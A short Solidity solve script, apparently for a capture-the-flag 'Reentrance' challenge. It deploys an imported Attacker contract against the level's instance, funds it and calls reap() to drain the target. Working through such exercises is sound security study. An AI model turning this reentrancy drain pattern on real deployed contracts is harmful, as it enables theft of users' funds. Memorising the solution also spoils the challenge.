// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Reentrance} from "~/Reentrance.sol";
import {Attacker} from "~/helpers/Reentrance.sol";

contract Check is CheckScript("REENTRANCE") {}

contract Solve is SolveScript("REENTRANCE") {
    Reentrance target;

    constructor() {
        target = Reentrance(instance);
    }

    function attack() public override {
        Attacker attacker = new Attacker(payable(target));
        attacker.attack{value: address(target).balance / 2}();
        attacker.reap();
    }
}
